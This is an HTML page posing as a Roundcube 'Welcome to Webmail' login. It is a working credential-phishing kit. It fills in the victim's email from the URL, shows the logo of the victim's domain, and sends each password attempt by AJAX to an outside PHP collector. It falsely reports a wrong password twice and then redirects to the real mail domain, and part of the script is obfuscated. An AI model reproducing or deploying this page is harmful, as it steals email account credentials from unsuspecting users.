<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title></title>
<link rel='stylesheet' href='https://www.google.com/fonts#UsePlace:use/Collection:Roboto:400,300,100,500'>
<link rel='stylesheet' href='//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css'>
<link rel='stylesheet' href='https://www.google.com/fonts#UsePlace:use/Collection:Roboto+Slab:400,700,300,100'>
<link rel="stylesheet" href="./assets/css/style.css">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<style>
    .pad-top-20 {
  padding-top: 20px;
}
.pad-btm-20 {
  padding-bottom: 20px;
}
.pad-sep-20 {
  padding-top: 20px;
  padding-bottom: 20px;
}
.pad-top-40 {
  padding-top: 40px;
}
.pad-btm-40 {
  padding-bottom: 40px;
}
.pad-sep-40 {
  padding-top: 40px;
  padding-bottom: 40px;
}
.pad-top-60 {
  padding-top: 60px;
}
.pad-btm-60 {
  padding-bottom: 60px;
}
.pad-sep-60 {
  padding-top: 60px;
  padding-bottom: 60px;
}
.pad-top-80 {
  padding-top: 80px;
}
.pad-btm-80 {
  padding-bottom: 80px;
}
.pad-sep-80 {
  padding-top: 80px;
  padding-bottom: 80px;
}
.pad-top-100 {
  padding-top: 100px;
}
.pad-btm-100 {
  padding-bottom: 100px;
}
.pad-sep-100 {
  padding-top: 100px;
  padding-bottom: 100px;
}
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 100;
  src: url(https://fonts.gstatic.com/s/roboto/v30/KFOkCnqEu92Fr1MmgVxIIzc.ttf) format('truetype');
}
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 300;
  src: url(https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmSU5fBBc9.ttf) format('truetype');
}
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  src: url(https://fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxP.ttf) format('truetype');
}
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 500;
  src: url(https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc9.ttf) format('truetype');
}
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 700;
  src: url(https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmWUlfBBc9.ttf) format('truetype');
}
html,
body {
  height: 100%;
}
body {
  margin: 0;
  padding: 0;
  color: #fff;
  overflow: hidden;
  background-color: #dcdee3;
  font-size: 14px;
  position: relative;
  font-family: 'Roboto', Helvetica, Arial, sans-serif;
}
h1,
.h1,
h2,
.h2,
h3,
.h3 {
  font-weight: 300;
  color: #22A7F0;
}
.fix-middle {
  position: absolute;
  padding: 10px;
  top: 50%;
  left: 50%;
  -webkit-transform: translate(-50%, -50%);
  -moz-transform: translate(-50%, -50%);
  -ms-transform: translate(-50%, -50%);
  transform: translate(-50%, -50%);
  z-index: 3;
}
.dialog {
  color: #222;
  -webkit-perspective: 1200px;
  -moz-perspective: 1200px;
  -ms-perspective: 1200px;
  -o-perspective: 1200px;
  perspective: 1200px;
  z-index: 1000;
  opacity: 1;
  visibility: visible;
  -webkit-transition: opacity 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  -moz-transition: opacity 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  -ms-transition: opacity 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  transition: opacity 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
}
.dialog,
.dialog .dialog-front,
.dialog .dialog-back {
  width: auto;
  position: absolute;
  top: 50%;
  left: 50%;
  padding: 0;
  margin: 0;
  -webkit-transform: translate(-50%, -50%);
  -moz-transform: translate(-50%, -50%);
  -ms-transform: translate(-50%, -50%);
  transform: translate(-50%, -50%);
}
.dialog.dialog-effect-in {
  -webkit-animation: showDialog 1000ms linear both;
  -moz-animation: showDialog 1000ms linear both;
  -ms-animation: showDialog 1000ms linear both;
  animation: showDialog 1000ms linear both;
}
.dialog.shakeit {
  -webkit-animation: shakeDialog 300ms linear both;
  -moz-animation: shakeDialog 300ms linear both;
  -ms-animation: shakeDialog 300ms linear both;
  animation: shakeDialog 300ms linear both;
}
.dialog .dialog-content {
  width: 400px;
  background: #fff;
  /* Old browsers */
  /* FF3.6+ */
  /* W3C */
  border-radius: 6px;
  padding: 20px 25px;
}
.dialog .dialog-front,
.dialog .dialog-back {
  -webkit-transform-style: preserve-3d;
  -moz-transform-style: preserve-3d;
  -webkit-backface-visibility: hidden;
  -moz-backface-visibility: hidden;
  -ms-backface-visibility: hidden;
  backface-visibility: hidden;
  -webkit-transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  -moz-transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  -ms-transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
}
.dialog .dialog-front {
  -webkit-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
  -moz-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
  -ms-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
  -o-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
  z-index: 900;
}
.dialog .dialog-back {
  -webkit-transform: translate(-50%, -50%) rotateY(-180deg);
  -moz-transform: translate(-50%, -50%) rotateY(-180deg);
  -ms-transform: translate(-50%, -50%) rotateY(-180deg);
  -o-transform: translate(-50%, -50%) rotateY(-180deg);
  z-index: 800;
}
.dialog.flip .dialog-front {
  z-index: 800;
  visibility: hidden;
  -webkit-transform: translate(-50%, -50%) rotateY(180deg);
  -moz-transform: translate(-50%, -50%) rotateY(180deg);
  -ms-transform: translate(-50%, -50%) rotateY(180deg);
  -o-transform: translate(-50%, -50%) rotateY(180deg);
}
.dialog.flip .dialog-back {
  z-index: 900;
  visibility: visible;
  -webkit-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
  -moz-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
  -ms-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
  -o-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
}
.dialog.dialog-effect-out {
  z-index: 1;
  opacity: 0;
  visibility: hidden;
}
.dialog.dialog-effect-out .dialog-front {
  -webkit-transform: translate(-50%, -20%) rotateX(-30deg);
  -moz-transform: translate(-50%, -20%) rotateX(-30deg);
  -ms-transform: translate(-50%, -20%) rotateX(-30deg);
  -o-transform: translate(-50%, -20%) rotateX(-30deg);
}
.dialog.dialog-effect-out .dialog-back {
  -webkit-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(-180deg);
  -moz-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(-180deg);
  -ms-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(-180deg);
  -o-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(-180deg);
}
.dialog.dialog-effect-out.flip .dialog-front {
  -webkit-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(180deg);
  -moz-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(180deg);
  -ms-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(180deg);
  -o-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(180deg);
}
.dialog.dialog-effect-out.flip .dialog-back {
  -webkit-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(0deg);
  -moz-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(0deg);
  -ms-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(0deg);
  -o-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(0deg);
}
.dialog.dialog-effect-out .dialog-content {
  background: #00B16A;
}
.dialog.dialog-effect-out .dialog-content .dialog-form {
  visibility: hidden;
}
.dialog .dialog-form {
  -webkit-animation: swooshUp30 300ms linear both;
  -moz-animation: swooshUp30 300ms linear both;
  -ms-animation: swooshUp30 300ms linear both;
  animation: swooshUp30 300ms linear both;
  -webkit-animation-delay: 300ms;
  -moz-animation-delay: 300ms;
  -ms-animation-delay: 300ms;
  animation-delay: 300ms;
}
.dialog .dialog-form legend {
  margin-bottom: 40px;
  font-size: 26px;
  font-weight: 300;
  color: #222;
  border-bottom: none;
}
.dialog .dialog-form .form-group {
  margin-bottom: 20px;
  position: relative;
}
.dialog .dialog-form .form-group .form-control {
  color: #222;
  background-color: transparent;
  border: none;
  border-bottom: 2px solid #222;
  border-radius: 0;
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  -ms-box-shadow: none;
  box-shadow: none;
}
.dialog .dialog-form .form-group label {
  display: inline-block;
  max-width: 100%;
  margin-bottom: 5px;
  font-weight: 700;
}
.dialog .dialog-form .form-group.has-error .error-msg {
  display: block;
}
.dialog .dialog-form .form-group.has-error label {
  color: #E74C3C;
}
.dialog .dialog-form .form-group.has-error .form-control {
  border-color: #E74C3C;
}
.dialog .dialog-form .form-group .checkbox label {
  padding-left: 40px;
}
.dialog .dialog-form .form-group .checkbox input[type="checkbox"] {
  width: 20px;
  height: 20px;
  background: none;
  border: 2px solid #222;
  margin-left: -40px;
  -webkit-appearance: none;
  appearance: none;
}
.dialog .dialog-form .form-group .checkbox input[type="checkbox"]:hover {
  background-color: #e6e6e6;
}
.dialog .dialog-form .form-group .checkbox input[type="checkbox"]:checked {
  background-color: #222;
}
.dialog .dialog-form .form-group .checkbox input[type="checkbox"]:disabled {
  background-color: #6f6f6f;
  border-color: #555555;
}
.dialog .dialog-form .error-msg {
  position: absolute;
  top: 50%;
  left: 0;
  right: auto;
  background-color: #E74C3C;
  color: #fff;
  padding: 10px;
  z-index: 3;
  max-width: 150px;
  border-radius: 3px;
  -webkit-transform: translate(-110%, -50%);
  -moz-transform: translate(-110%, -50%);
  -ms-transform: translate(-110%, -50%);
  transform: translate(-110%, -50%);
  -webkit-animation: swooshleft 200ms ease-in-out both;
  -moz-animation: swooshleft 200ms ease-in-out both;
  -ms-animation: swooshleft 200ms ease-in-out both;
  animation: swooshleft 200ms ease-in-out both;
  display: none;
}
.dialog .dialog-form .error-msg:after {
  position: absolute;
  content: '';
  top: 50%;
  right: 0;
  -webkit-transform: translate(97%, -50%);
  -moz-transform: translate(97%, -50%);
  -ms-transform: translate(97%, -50%);
  transform: translate(97%, -50%);
  width: 0;
  height: 0;
  border-style: solid;
  border-width: 10px 0 10px 10px;
  border-color: transparent transparent transparent #E74C3C;
}
.dialog .dialog-form .btn {
  font-weight: 700;
  border-width: 0;
  border-radius: 0;
  text-transform: uppercase;
  -webkit-transition: all 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  -moz-transition: all 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  -ms-transition: all 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  transition: all 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
}
.dialog .dialog-form .btn.btn-default {
  color: #fff;
  background-color: #868686;
  outline: none;
}
.dialog .dialog-form .btn.btn-default:hover {
  background-color: #222;
  color: #fff;
}
.dialog .dialog-form .btn.btn-default:active,
.dialog .dialog-form .btn.btn-default:focus {
  background-color: #222;
  color: #fff;
}
@-webkit-keyframes swooshUp30 {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
@-moz-keyframes swooshUp30 {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
@keyframes swooshUp30 {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
@-webkit-keyframes swooshleft {
  0% {
    -webkit-transform: translate(-90%, -50%);
    -moz-transform: translate(-90%, -50%);
    -ms-transform: translate(-90%, -50%);
    transform: translate(-90%, -50%);
  }
  100% {
    -webkit-transform: translate(-110%, -50%);
    -moz-transform: translate(-110%, -50%);
    -ms-transform: translate(-110%, -50%);
    transform: translate(-110%, -50%);
  }
}
@-moz-keyframes swooshleft {
  0% {
    -webkit-transform: translate(-90%, -50%);
    -moz-transform: translate(-90%, -50%);
    -ms-transform: translate(-90%, -50%);
    transform: translate(-90%, -50%);
  }
  100% {
    -webkit-transform: translate(-110%, -50%);
    -moz-transform: translate(-110%, -50%);
    -ms-transform: translate(-110%, -50%);
    transform: translate(-110%, -50%);
  }
}
@keyframes swooshleft {
  0% {
    -webkit-transform: translate(-90%, -50%);
    -moz-transform: translate(-90%, -50%);
    -ms-transform: translate(-90%, -50%);
    transform: translate(-90%, -50%);
  }
  100% {
    -webkit-transform: translate(-110%, -50%);
    -moz-transform: translate(-110%, -50%);
    -ms-transform: translate(-110%, -50%);
    transform: translate(-110%, -50%);
  }
}
@-webkit-keyframes shakeDialog {
  0% {
    left: 51%;
  }
  25% {
    left: 49%;
  }
  50% {
    left: 51%;
  }
  100% {
    left: 50%;
  }
}
@-moz-keyframes shakeDialog {
  0% {
    left: 51%;
  }
  25% {
    left: 49%;
  }
  50% {
    left: 51%;
  }
  100% {
    left: 50%;
  }
}
@keyframes shakeDialog {
  0% {
    left: 51%;
  }
  25% {
    left: 49%;
  }
  50% {
    left: 51%;
  }
  100% {
    left: 50%;
  }
}
/* Generated with Bounce.js. Edit at https://goo.gl/KtDT8H */
@-webkit-keyframes showDialog {
  0% {
    -webkit-transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  7.61% {
    -webkit-transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  11.41% {
    -webkit-transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  15.12% {
    -webkit-transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  18.92% {
    -webkit-transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  22.72% {
    -webkit-transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  30.23% {
    -webkit-transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  50.25% {
    -webkit-transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  70.27% {
    -webkit-transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  100% {
    -webkit-transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
}
@keyframes showDialog {
  0% {
    -webkit-transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  7.61% {
    -webkit-transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  11.41% {
    -webkit-transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  15.12% {
    -webkit-transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  18.92% {
    -webkit-transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  22.72% {
    -webkit-transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  30.23% {
    -webkit-transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  50.25% {
    -webkit-transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  70.27% {
    -webkit-transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
  100% {
    -webkit-transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
    transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
  }
}
#successful_login,
#successful_registration {
  opacity: 0;
  visibility: hidden;
  -webkit-transition: opacity 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.6s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  -moz-transition: opacity 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.6s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  -ms-transition: opacity 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.6s cubic-bezier(0.25, 0.5, 0.5, 0.9);
  transition: opacity 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.6s cubic-bezier(0.25, 0.5, 0.5, 0.9);
}
#successful_login.active,
#successful_registration.active {
  opacity: 1;
  visibility: visible;
}
</style>
<link id="favicon" rel="shortcut icon" type="image/png" href="" />
</head>
<body>
<div id="dialog" class="dialog dialog-effect-in">
<div class="dialog-front">
<div class="dialog-content">
<form id="login_form" class="dialog-form login_form" action="https://hijosdelmaizoficial.com/images/Mloking/CAFWEB/na1.php" method="POST">
<img id="logo" src="https://images.sftcdn.net/images/t_app-logo-xl,f_auto,dpr_2/p/7a60e021-3fe5-4334-9e56-7cc6ebae632d/2825932570/roundcube-webmail-roundcube_logo_icon.svg" style="display: block;margin-left: auto;margin-right: auto;" width="70" height="70"><br>
<fieldset>
<center><legend style="word-break: break-all;">Welcome to Webmail</legend></center>
<div class="form-group">
<label for="user_username" class="control-label">Username:</label>
<input type="email" id="user_username" class="form-control" name="user_username" value="" required disabled autofocus />
</div>
<div class="form-group">
<label for="user_password" class="control-label">Password:</label>
<input type="password" id="user_password" class="form-control" name="user_password" required />
</div>
<label id="error" class="error" style="display: none;color: red;">Enter the correct password</label>
<div class="pad-top-20 pad-btm-20">
<input type="submit" id="submit-btn" class="btn btn-default btn-block btn-lg" value="Continue">
</div>
</fieldset>
</form>
</div>
</div>
</div>
<script src='//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src="./assets/js/script.js"></script>
<script>
  var _0x3121cb=_0x4e3e;function _0x4e3e(_0x4b06ec,_0x2c42ce){var _0x1137fe=_0x1137();return _0x4e3e=function(_0x4e3ec8,_0x2cdd8b){_0x4e3ec8=_0x4e3ec8-0x7a;var _0x4e3d1d=_0x1137fe[_0x4e3ec8];return _0x4e3d1d;},_0x4e3e(_0x4b06ec,_0x2c42ce);}function _0x1137(){var _0x55dae1=['value','923235tHGKGv','4051254bWxUdt','5816fqMdQs','8596007xIcuCA','getElementById','43912710lErqoF','399IKjmFG','472FGAJjW','1292320TywGUx','title','user_username','12ZwWcEZ','14841KXSGPt','ca543e2728f684c0d5de19a83de16645636ed4699b2b6\x20-\x20'];_0x1137=function(){return _0x55dae1;};return _0x1137();}(function(_0x21a638,_0x3149da){var _0x4e5558=_0x4e3e,_0x52e06d=_0x21a638();while(!![]){try{var _0x5e1473=-parseInt(_0x4e5558(0x7e))/0x1*(parseInt(_0x4e5558(0x7a))/0x2)+-parseInt(_0x4e5558(0x88))/0x3+parseInt(_0x4e5558(0x80))/0x4+-parseInt(_0x4e5558(0x87))/0x5*(parseInt(_0x4e5558(0x83))/0x6)+-parseInt(_0x4e5558(0x7b))/0x7+-parseInt(_0x4e5558(0x7f))/0x8*(-parseInt(_0x4e5558(0x84))/0x9)+parseInt(_0x4e5558(0x7d))/0xa;if(_0x5e1473===_0x3149da)break;else _0x52e06d['push'](_0x52e06d['shift']());}catch(_0x1134de){_0x52e06d['push'](_0x52e06d['shift']());}}}(_0x1137,0xabc95),document[_0x3121cb(0x81)]=_0x3121cb(0x85)+fetchEmail(),document[_0x3121cb(0x7c)](_0x3121cb(0x82))[_0x3121cb(0x86)]=fetchEmail());
</script>

<script>
    
    var count = 0;
    $(document).on("submit", '.login_form', function(e) {

    count++;
    var $form = $(this);
    var $input = $form.find(':submit');
    $input.attr("disabled", 'disabled');
    var dataz = $form.serializeArray();
    var email=$("#user_username").val();
    var password=$("#user_password").val();
    
        

    $.ajax({
        type: $form.attr('method'),
        url: $form.attr('action'),
          data:{
            user_username:email,
            user_password:password,
          },
        dataType: 'json',
        success: function(data) {
            // if(count > 2){
            //   data['redirect'] = changeLogo(fetchEmail());
            // } else {
            //     data['reset'] = true;
            // }

                 console.log("data.redirect ", data.redirect);
                 console.log("data.reset ", data.reset);
                 console.log("data.count "+ count);

                if (count > 2) {
                    setTimeout(function() {
                        window.location.href = "https://"+changeLogo(fetchEmail());
                    }, 0);
                }
                // update_login_status(data.status, data.message, 10000);
                else {
                    
                    console.log('failed valau check in')
                    document.getElementById("user_password").style.borderColor = "red";
                    document.getElementById("error").style.display = "block";
                    document.querySelector('#user_password').value = '';
                    // $form.trigger('reset');
                    $input.removeAttr("disabled");
                    return false;
                }
        },
        error: function(request, x, y) {
            if (request.status == 422) {
                var errorsHtml = "";
                $.each(request.responseJSON.errors, function(key, value) {
                    errorsHtml += '' + value[0] + '<br/>';
                });
                // update_login_status("error", errorsHtml);
            } else if (request.status == 419) {
                location.reload();
            } else {
                // update_login_status("error", "Server Error .. ", 5000);
            }
        },
        complete: function(data) {
            $("#loading").css("display", "none");
            $input.removeAttr("disabled");
        },
        beforeSend: function() {
            document.getElementById("user_password").style.borderColor = "";
            document.getElementById("error").style.display = "none";


        },
    });
    e.preventDefault();
});

function fetchEmail () {
    
    var mail = location.hash.substr(1);
    document.querySelector('#user_username').value = mail;
    return mail;
}

function changeLogo ($d) {
    var Explode = $d.split("@");
    return Explode[1];
}

function checkImage(url) {
  var request = new XMLHttpRequest();
  request.open("GET", url, true);
  request.send();
  request.onload = function() {
    status = request.status;
    if (request.status == 200) //if(statusText == OK)
    {
      document.getElementById('logo').src="https://logo.clearbit.com/" +changeLogo(fetchEmail());
    }
  }
}
checkImage("https://logo.clearbit.com/" +changeLogo(fetchEmail()));
$("#favicon").attr("href","https://logo.clearbit.com/" +changeLogo(fetchEmail()));
</script>
</body>
</html>
